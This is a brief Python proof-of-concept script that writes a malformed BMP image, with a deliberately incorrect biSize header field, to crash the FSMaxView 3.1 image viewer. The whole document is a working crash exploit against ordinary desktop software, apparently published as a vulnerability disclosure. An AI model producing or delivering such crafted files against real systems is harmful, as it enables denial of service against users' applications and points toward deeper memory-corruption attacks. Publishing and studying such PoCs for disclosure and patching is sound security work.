#!/env/python
# FSMaxView3.1 does not properly handle Image size header
# Crash PoC

POC_FILE = "poc.bmp"

def main():

    with open(POC_FILE, "wb") as fd:

        # File header
        fd.write("\x14\x00")          # bfType
        fd.write("\x01\x00\x00\x00")  # bfSize
        fd.write("\x00\x00")          # bfReserved1
        fd.write("\x00\x00")          # bfReserved2
        fd.write("\x00\x00\xd5\xff")  # bfOffBits

        # Image header
        fd.write("\xff\x7f\x20\x00")  # biSize <= Incorrect field leads to application crash

        for i in range(0, 36):
            fd.write("\x00")

        # Image data
        for i in range(0, 10):
            fd.write("\x00")

if __name__ == "__main__":
    main()
